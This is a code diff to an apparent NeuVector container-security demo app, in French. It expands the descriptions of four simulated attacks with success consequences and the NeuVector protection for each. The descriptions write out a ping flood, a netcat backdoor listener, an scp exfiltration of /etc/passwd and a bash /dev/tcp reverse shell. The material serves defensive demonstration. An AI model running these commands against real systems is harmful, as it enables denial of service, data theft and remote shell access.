@@ -2807,7 +2807,7 @@ class DemoApp {
                         <button type="button" class="btn btn-outline btn-cmd attack-btn" data-attack="reverse_shell" title="Reverse Shell">🐚 SHELL</button>
                     </div>
                     <div class="attack-description" id="attack-description">
-                        <strong>DoS Ping Flood</strong> - Envoie des paquets ICMP surdimensionnés (40KB) pour saturer la cible. Commande: <code>ping -s 40000 -c 5 &lt;target&gt;</code>. Bloqué par NeuVector via les règles réseau (Network Rules) si le trafic ICMP n'est pas autorisé.
+                        <strong>DoS Ping Flood</strong> - Envoie des paquets ICMP surdimensionnés (40KB) pour saturer la cible. Commande: <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>Si l'attaque réussit:</em> La cible est saturée, les services deviennent indisponibles (déni de service).<br><em>Protection:</em> Bloqué par NeuVector via les règles réseau (Network Rules) si le trafic ICMP n'est pas autorisé.
                     </div>
                 </div>
                 <div class="nv-logs-container" id="nv-logs-container">
@@ -2912,10 +2912,10 @@ class DemoApp {
             'reverse_shell': '🐚 SHELL'
         };
         const attackDescriptions = {
-            'dos_ping': '<strong>DoS Ping Flood</strong> - Envoie des paquets ICMP surdimensionnés (40KB) pour saturer la cible. Commande: <code>ping -s 40000 -c 5 &lt;target&gt;</code>. Bloqué par NeuVector via les règles réseau (Network Rules) si le trafic ICMP n\'est pas autorisé.',
-            'nc_backdoor': '<strong>NC Backdoor</strong> - Ouvre un port d\'écoute avec netcat pour créer une backdoor. Commande: <code>nc -l 4444</code>. Bloqué par NeuVector en mode Protect car le processus <code>nc</code> n\'est pas dans le profil autorisé (Process Profile Rules).',
-            'scp_transfer': '<strong>SCP Transfer</strong> - Tente de transférer un fichier sensible (/etc/passwd) vers une cible distante. Commande: <code>scp /etc/passwd root@&lt;target&gt;:/tmp/</code>. Bloqué par NeuVector via les règles réseau ou le profil de processus.',
-            'reverse_shell': '<strong>Reverse Shell</strong> - Tente d\'établir une connexion shell inverse vers un attaquant. Commande: <code>bash -i &gt;&amp; /dev/tcp/&lt;target&gt;/4444 0&gt;&amp;1</code>. Bloqué par NeuVector en mode Protect car c\'est un processus non autorisé.'
+            'dos_ping': '<strong>DoS Ping Flood</strong> - Envoie des paquets ICMP surdimensionnés (40KB) pour saturer la cible. Commande: <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>Si l\'attaque réussit:</em> La cible est saturée, les services deviennent indisponibles (déni de service).<br><em>Protection:</em> Bloqué par NeuVector via les règles réseau (Network Rules) si le trafic ICMP n\'est pas autorisé.',
+            'nc_backdoor': '<strong>NC Backdoor</strong> - Ouvre un port d\'écoute avec netcat pour créer une backdoor. Commande: <code>nc -l 4444</code>.<br><em>Si l\'attaque réussit:</em> Un attaquant peut se connecter au port 4444 et obtenir un accès shell au conteneur compromis.<br><em>Protection:</em> Bloqué par NeuVector en mode Protect car le processus <code>nc</code> n\'est pas dans le profil autorisé (Process Profile Rules).',
+            'scp_transfer': '<strong>SCP Transfer</strong> - Tente de transférer un fichier sensible (/etc/passwd) vers une cible distante. Commande: <code>scp /etc/passwd root@&lt;target&gt;:/tmp/</code>.<br><em>Si l\'attaque réussit:</em> Exfiltration de données sensibles (identifiants, configurations) vers un serveur contrôlé par l\'attaquant.<br><em>Protection:</em> Bloqué par NeuVector via les règles réseau ou le profil de processus.',
+            'reverse_shell': '<strong>Reverse Shell</strong> - Tente d\'établir une connexion shell inverse vers un attaquant. Commande: <code>bash -i &gt;&amp; /dev/tcp/&lt;target&gt;/4444 0&gt;&amp;1</code>.<br><em>Si l\'attaque réussit:</em> L\'attaquant obtient un accès shell interactif complet au conteneur, permettant l\'exécution de commandes arbitraires.<br><em>Protection:</em> Bloqué par NeuVector en mode Protect car c\'est un processus non autorisé.'
         };
 
         attackButtons.forEach(btn => {
